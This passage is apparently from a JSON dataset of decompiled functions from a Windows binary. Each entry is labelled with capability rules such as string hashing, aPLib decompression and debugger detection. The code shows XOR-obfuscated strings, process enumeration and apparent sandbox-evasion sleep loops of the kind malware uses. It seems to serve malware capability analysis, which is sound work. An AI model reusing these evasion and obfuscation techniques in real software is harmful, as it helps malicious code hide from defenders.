if (iVar2 < 0) {\n                iVar1 = iVar2;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 898
    },
    "00403920": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403920(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 235
    },
    "0040b000": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040b000(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 151
    },
    "0040bdd2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.0040bdd2(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uchar *var_8h;\n    uint var_4h;\n    \n    var_44h = 0x59217232;\n    var_40h = 0x72374b04;\n    var_3ch = 0x4b015926;\n    var_38h = 0x592b7234;\n    var_34h = 0x72394b0e;\n    var_30h = 0x4b0b5928;\n    var_2ch = 0x592d723e;\n    var_28h = 0x72234b08;\n    var_24h = 0x4b155932;\n    var_20h = 0x59377220;\n    var_1ch = 0x72254b12;\n    var_18h = 0x4b1f5934;\n    var_14h = 0x5939722a;\n    var_10h._0_2_ = 0x4b67;\n    var_8h = 0x59437253;\n    var_4h._0_2_ = 0x4b67;\n    fcn.00401000(0x6c);\n    puVar1 = var_ch;\n    iVar8 = 0;\n    iVar6 = &var_44h - var_ch;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar2 != 0x39537a) {\n            var_ch = 0x6;\n            puVar1[iVar8] = *(&var_8h + iVar8 % 6) ^ (puVar1 + iVar8)[iVar6];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x36);\n    uVar3 = fcn.0040bc8c();\n    puVar7 = (uVar3 & 1) + 8;\n    puVar5 = var_ch;\n    if (puVar7 != NULL) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar7 * 2 + 2);\n        puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        var_8h = puVar5;\n        if (puVar5 != NULL) {\n            var_ch = NULL;\n            puVar9 = puVar5;\n            for (iVar6 = puVar7 * 2 + 2; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (puVar7 != NULL) {\n                do {\n                    iVar6 = fcn.0040bc8c();\n                    *(puVar5 + var_ch * 2) = *(puVar1 + (iVar6 % 0x1a) * 2);\n                    var_ch = var_ch + 1;\n                } while (var_ch < puVar7);\n            }\n            *(puVar5 + puVar7 * 2) = 0;\n        }\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar1);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return puVar5;\n}\n",
        "token_count": 916
    },
    "004094f9": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004094f9(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t dwSize;\n    \n    pcVar1 = _sym.imp.ntdll.dll_NtQuerySystemInformation;\n    dwSize = 0;\n    iVar2 = (*_sym.imp.ntdll.dll_NtQuerySystemInformation)(5, 0, 0, &dwSize);\n    if (iVar2 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar3 != NULL) {\n            iVar2 = (*pcVar1)(5, piVar3, dwSize, 0);\n            piVar6 = piVar3;\n            if (-1 < iVar2) {\n                do {\n                    iVar2 = piVar6[0x11];\n                    if (((iVar2 != 0) && (iVar2 != 4)) && (iVar2 != *0x41cd34)) {\n                        uVar4 = fcn.00409aca();\n                        uVar5 = fcn.00406e7a();\n                        iVar2 = (*param_1)(piVar6[0xf], uVar5, piVar6[0x11], piVar6[0x12], uVar4, param_2);\n                        if (iVar2 == 0) {\ncode_r0x004095bf:\n                            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar3, 0, 0x8000);\n                            return 0;\n                        }\n                    }\n                    if (*piVar6 == 0) goto code_r0x004095bf;\n                    piVar6 = piVar6 + *piVar6;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar3, 0, 0x8000);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 506
    },
    "004041af": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.004041af(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.004039ca(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.0040ba41();\n    }\n    return iVar1;\n}\n",
        "token_count": 180
    },
    "0040721d": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.0040721d(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41cd44 == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 176
    },
    "004041fb": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004041fb(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t lpModuleName;\n    \n    var_8h = 0;\n    puVar9 = &var_20h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_2ch = 0x1b280202;\n    var_28h = 0x2012421e;\n    var_24h = CONCAT22(var_24h._2_2_, 0x721b);\n    var_18h = 0x774c766c;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x72);\n    fcn.00401000(10);\n    iVar6 = lpModuleName;\n    iVar8 = 0;\n    iVar7 = &var_2ch - lpModuleName;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x50efc5) {\n            var_ch = 5;\n            *(iVar8 + iVar6) = *(&var_18h + iVar8 % 5) ^ (iVar8 + iVar6)[iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_30h = 0x2a041635;\n    var_2ch = 0x17170e2b;\n    var_28h = 0x11070c1c;\n    var_24h = 0x695a5104;\n    var_18h = 0x69686267;\n    var_14h._0_2_ = 0x6344;\n    fcn.00401000(0x10);\n    iVar6 = var_ch;\n    iVar8 = 0;\n    iVar7 = &var_30h - var_ch;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar3 != 0xc95583) {\n            var_ch = 6;\n            *(iVar8 + iVar6) = *(&var_18h + iVar8 % 6) ^ (iVar8 + iVar6)[iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x10);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    cVar2 = fcn.0040b4fa();\n    if (cVar2 != '\\0') {\n        var_8h = (*pcVar5)(0, var_1ch, var_20h);\n    }\n    fcn.0040ba41();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar1)(0, lpModuleName);\n    (*pcVar5)(uVar4);\n    return var_8h;\n}\n",
        "token_count": 888
    },
    "00404920": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404920(void)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    uint uStack1408;\n    uint uStack1404;\n    uchar *puStack1400;\n    uint uStack1396;\n    uchar *puStack1368;\n    uint uStack1364;\n    uint uStack1360;\n    uint uStack1356;\n    int32_t iVar11;\n    int16_t iVar12;\n    uint uVar13;\n    int32_t iStack1320;\n    uint uStack1316;\n    ushort uStack1312;\n    uchar uStack1310;\n    uchar uStack1309;\n    ushort uStack1308;\n    uchar uStack1306;\n    uchar uStack1305;\n    uchar uStack1304;\n    uchar uStack1303;\n    uchar uStack1302;\n    uchar uStack1301;\n    uchar uStack1300;\n    ushort uStack1299;\n    uchar uStack1297;\n    int32_t iStack1296;\n    int32_t iStack1292;\n    uint8_t auStack1288 [4];\n    uint uStack1284;\n    uint uStack1280;\n    uint uStack1276;\n    int32_t iStack1272;\n    int32_t iStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    uint uStack1256;\n    uint uStack1252;\n    uint uStack1248;\n    uint uStack1244;\n    uint uStack1240;\n    uint uStack1236;\n    uint uStack1232;\n    uint uStack1228;\n    uint uStack1224;\n    uint uStack1220;\n    int32_t iStack1216;\n    uint uStack1212;\n    uint uStack1208;\n    uint uStack1204;\n    uint uStack1200;\n    uint uStack1196;\n    ushort uStack1192;\n    uint32_t uStack1172;\n    int32_t iStack1168;\n    int32_t iStack1164;\n    uint uStack1160;\n    int32_t iStack1156;\n    uint uStack1144;\n    uint uStack1140;\n    uchar auStack1136 [16];\n    uchar auStack1120 [12];\n    uchar auStack1108 [4];\n    int16_t iStack1104;\n    uchar auStack1102 [22];\n    uchar auStack1080 [12];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    uStack1144 = 0x200;\n    uStack1312 = 0x533c;\n    uStack1310 = 0x1d;\n    uStack1309 = 0x29;\n    uStack1308 = 0x3b07;\n    puVar10 = &stack0xfffffbf8;\n    for (iVar6 = 0x400; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1305 = 0x5d;\n    uStack1304 = 0x69;\n    puVar10 = &stack0xfffffb90;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1302 = 0x3b;\n    uStack1301 = 0x5a;\n    puVar10 = &stack0xfffffbd4;\n    for (iVar6 = 0x24; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1264 = 5;\n    uStack1306 = 5;\n    uStack1140 = 6;\n    uStack1303 = 6;\n    uStack1300 = 0x6f;\n    fcn.00401000(0xd);\n    iStack1272 = 0;\n    iVar6 = 0;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar3 != 0x46b089) {\n            *(iVar6 + iStack1156) =\n                 (&stack0xfffffac8)[iVar6 % iStack1268] ^ (iVar6 + iStack1156)[&stack0xfffffadc + -iStack1156];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    uStack1316 = 0x1c130a29;\n    uStack1312 = 0x1a15;\n    uStack1310 = 6;\n    uStack1309 = 0x11;\n    uStack1308 = 0x2737;\n    uStack1306 = 0x17;\n    uStack1305 = 0x1c;\n    uStack1304 = 0x13;\n    uStack1303 = 0x37;\n    uStack1302 = 0x19;\n    uStack1301 = 0x27;\n    uStack1300 = 1;\n    uStack1299 = 0x3d01;\n    uStack1297 = 0x74;\n    uStack1356 = 0x404a41;\n    fcn.00401000(0x14);\n    iVar6 = 0;\n    do {\n        uStack1356 = 0x404a5a;\n        iVar3 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar3 != 0x5ac8d0) {\n            *(iVar6 + iStack1164) =\n                 (&stack0xfffffac4)[iVar6 % iStack1272] ^ (iVar6 + iStack1164)[&stack0xfffffad8 + -iStack1164];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x14);\n    uStack1356 = iStack1164;\n    uStack1360 = uStack1160;\n    uStack1364 = 0x404a89;\n    uStack1364 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    puStack1368 = 0x404a90;\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    iStack1156 = 0x40;\n    puStack1368 = &stack0xfffffb7c;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    if (pcVar4 == NULL) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        (*pcVar4)();\n    }\n    uStack1284 = 0x4d557221;\n    uStack1280 = 0x34166936;\n    iVar6 = 0;\n    uStack1276 = 0x7208443a;\n    iStack1272 = 0x69214d46;\n    iStack1268 = 0x4409342e;\n    uStack1264 = 0x4d67722c;\n    uStack1260 = 0x34206907;\n    uStack1256 = 0x72394404;\n    uStack1252 = 0x690d4d60;\n    uStack1248 = 0x4403343d;\n    uStack1244 = 0x4d677235;\n    uStack1240 = 0x3401693d;\n    uStack1236 = 0x720c4439;\n    uStack1232 = 0x69184d59;\n    uStack1228 = 0x44283431;\n    uStack1224 = 0x4d407207;\n    uStack1220 = 0x34136936;\n    iStack1216 = 0x72394421;\n    uStack1212 = 0x692b4d46;\n    uStack1208 = 0x44283411;\n    uStack1204 = 0x4d47721a;\n    uStack1200 = 0x3400692b;\n    uStack1196 = 0x72594411;\n    uStack1192 = 0x4d34;\n    uStack1360 = 0x4d347269;\n    uStack1356 = CONCAT31(uStack1356._1_3_, 0x44);\n    fcn.00401000(0xbc);\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar3 != 0x292219) {\n            *(iVar6 + iStack1292) =\n                 (&stack0xfffffaac)[iVar6 % iStack1296] ^ (iVar6 + iStack1292)[&stack0xfffffaf8 + -iStack1292];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x5e);\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar13 = uStack1200;\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    if (iVar6 == 0) {\n        uStack1356 = 0x44117200;\n        iVar11 = 0x501b4410;\n        uVar13 = 0x740a6300;\n        iStack1320 = 0x74446315;\n        uStack1364 = 0x44637250;\n        uStack1360 = CONCAT31(uStack1360._1_3_, 0x74);\n        uStack1396 = 0x404c8f;\n        fcn.00401000(0x50);\n        iVar3 = iStack1320;\n        iVar6 = -iStack1320;\n        iVar9 = 0;\n        do {\n            uStack1396 = 0x404ca3;\n            iVar5 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n            iVar12 = uVar13;\n            if (iVar5 != 0x35a6) {\n                *(iVar9 + iVar3) =\n                     (&stack0xfffffaa8)[iVar9 % CONCAT13(uStack1309, CONCAT12(uStack1310, uStack1312))] ^\n                     (iVar9 + iVar3)[&stack0xfffffab0 + iVar6];\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x28);\n        uStack1396 = &stack0xfffffb58;\n        puStack1400 = &stack0xfffffbc8;\n        uStack1404 = 0;\n        uStack1408 = 0;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(uStack1196, iVar3);\n        piVar7 = &stack0xfffffbb0;\n        do {\n            iVar1 = *piVar7;\n            piVar7 = piVar7 + 1;\n        } while (iVar1 != iVar12);\n        pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (piVar7 - &stack0xfffffbb2 >> 1 != 0) {\n            uStack1404 = 0x683c7610;\n            puStack1400 = 0x76267020;\n            uStack1396 = CONCAT22(uStack1396._2_2_, 0x6859);\n            fcn.00401000(0x14);\n            iVar6 = 0;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                if (iVar3 != 0x32353b) {\n                    *(iVar6 + iVar11) =\n                         (&stack0xfffffa8c)[iVar6 % iStack1216] ^ (iVar6 + iVar11)[&stack0xfffffa80 + -iVar11];\n                }\n                pcVar4 = _sym.imp.SHLWAPI.dll_StrStrIW;\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffbac, iVar11);\n            iVar3 = uStack1356;\n            while (iVar6 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar6 = (*pcVar4)(&stack0xfffffba0, iVar11);\n            }\n            uVar13 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar13);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack1220);\n        uVar13 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*pcVar8)(uVar13);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar13 = uStack1200;\n    }\n    while ((uVar2 = uStack1200,  _sym.imp.KERNEL32.dll_GetProcessHeap = pcVar4,  uStack1200 = uVar13,  iStack1168 == 0\n           && (uStack1172 < 1200000000))) {\n        uStack1396 = 0x404e08;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar13 = uStack1200;\n        uStack1200 = uVar2;\n    }\n    uStack1396 = NULL;\n    puStack1400 = 0x404e2e;\n    puStack1400 = (*pcVar4)();\n    uStack1404 = 0x404e31;\n    (*pcVar8)();\n    uStack1404 = uVar2;\n    uStack1408 = 0;\n    uVar13 = (*pcVar4)();\n    (*pcVar8)(uVar13);\n    uVar13 = (*pcVar4)(0, uStack1220);\n    (*pcVar8)(uVar13);\n    return;\n}\n",
        "token_count": 3196
    },
    "004074e1": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004074e1(uchar *param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    uint var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uint var_43h;\n    uchar var_3ch;\n    uint var_3bh;\n    uchar var_37h;\n    uchar var_36h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41cd98 | *0x41cd9c) == 0) || ((*0x41cda0 | *0x41cda4) == 0)) || ((*0x41cda8 | *0x41cdac) == 0)) {\n        var_4h = 0x7f;\n        var_34h = 0x1b280202;\n        var_30h = 0x2012421e;\n        var_2ch._0_2_ = 0x721b;\n        var_24h = 0x774c766c;\n        var_20h._0_1_ = 0x72;\n        fcn.00401000(10);\n        iVar5 = var_8h;\n        iVar9 = 0;\n        var_10h = 5;\n        iVar6 = &var_34h - var_8h;\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar3 != 0x50efc5) {\n                *(iVar9 + iVar5) = *(&var_24h + iVar9 % var_10h) ^ (iVar9 + iVar5)[iVar6];\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 10);\n        var_14h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n        if (var_14h == 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            return var_4h;\n        }\n        var_34h = 0x27032c3b;\n        var_30h = 0x352c1600;\n        var_2ch._0_2_ = 0x307;\n        var_2ch._2_1_ = 0x77;\n        var_24h = 0x6b714877;\n        var_20h._0_1_ = 0x6f;\n        fcn.00401000(0xb);\n        iVar5 = var_18h;\n        iVar9 = 0;\n        iVar6 = &var_34h - var_18h;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetFocus)();\n            if (iVar3 != 0x21a996) {\n                puVar1 = iVar9 + iVar5;\n                *puVar1 = *(&var_24h + iVar9 % var_10h) ^ puVar1[iVar6];\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0xb);\n        *0x41cd98 = fcn.00409d97();\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        *0x41cd9c = *0x41cd98 >> 0x1f;\n        if ((*0x41cd98 | *0x41cd9c) == 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            uVar4 = (*pcVar7)(0, var_8h);\n            (*pcVar2)(uVar4);\n            return var_4h;\n        }\n        var_24h = 6;\n        var_4ch = 0x223b013c;\n        var_48h = 0x17202112;\n        _var_44h = 0x31120626;\n        stack0xffffffbc = 0x242c1705;\n        _var_3ch = 0x23113;\n        var_3bh._3_1_ = 0x3a;\n        var_37h = 0x16;\n        var_36h = 0x77;\n        var_30h = 0x65496570;\n        var_2ch._0_2_ = 0x5577;\n        fcn.00401000(0x17);\n        iVar5 = var_ch;\n        iVar9 = 0;\n        iVar6 = &var_4ch - var_ch;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n            if (iVar3 != 0x9e684a) {\n                *(iVar9 + iVar5) = *(&var_30h + iVar9 % var_24h) ^ (iVar9 + iVar5)[iVar6];\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x17);\n        *0x41cda0 = fcn.00409d97();\n        *0x41cda4 = *0x41cda0 >> 0x1f;\n        if ((*0x41cda0 | *0x41cda4) == 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_4ch = 0x31122613;\n            var_48h = 0x21343d3b;\n            _var_44h = 0x23200237;\n            stack0xffffffbc = 0x25353636;\n            _var_3ch = 0x3b2e271c;\n            var_3bh._3_1_ = 0x3b;\n            var_37h = 0x28;\n            var_36h = 0x42;\n            var_30h = 0x43425149;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x54);\n            fcn.00401000(0x17);\n            iVar5 = var_1ch;\n            iVar9 = 0;\n            iVar6 = &var_4ch - var_1ch;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                if (iVar3 != 0x31dc9c) {\n                    *(iVar9 + iVar5) = *(&var_30h + iVar9 % var_10h) ^ (iVar9 + iVar5)[iVar6];\n                }\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < 0x17);\n            *0x41cda8 = fcn.00409d97();\n            *0x41cdac = *0x41cda8 >> 0x1f;\n            if ((*0x41cda8 | *0x41cdac) != 0) {\n                var_4h = 0;\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n                (*pcVar7)(uVar4);\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n                (*pcVar7)(uVar4);\n                uVar4 = (*pcVar2)(0, var_8h);\n                (*pcVar7)(uVar4);\n                goto code_r0x00407804;\n            }\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        }\n        (*pcVar7)(uVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n        (*pcVar7)(uVar4);\n        uVar4 = (*pcVar2)(0, var_8h);\n        (*pcVar7)(uVar4);\n    }\n    else {\ncode_r0x00407804:\n        puVar8 = 0x41cd98;\n        for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *var_28h = *puVar8;\n            puVar8 = puVar8 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2223
    },
    "0040781a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040781a(uchar *param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uchar *puVar9;\n    int32_t iVar10;\n    uint var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uint var_43h;\n    uchar var_3ch;\n    uint var_3bh;\n    uchar var_37h;\n    uchar var_36h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41cd80 | *0x41cd84) == 0) || ((*0x41cd88 | *0x41cd8c) == 0)) || ((*0x41cd90 | *0x41cd94) == 0)) {\n        var_4h = 0x7f;\n        var_34h = 0x1b280202;\n        var_30h = 0x2012421e;\n        var_2ch._0_2_ = 0x721b;\n        var_24h = 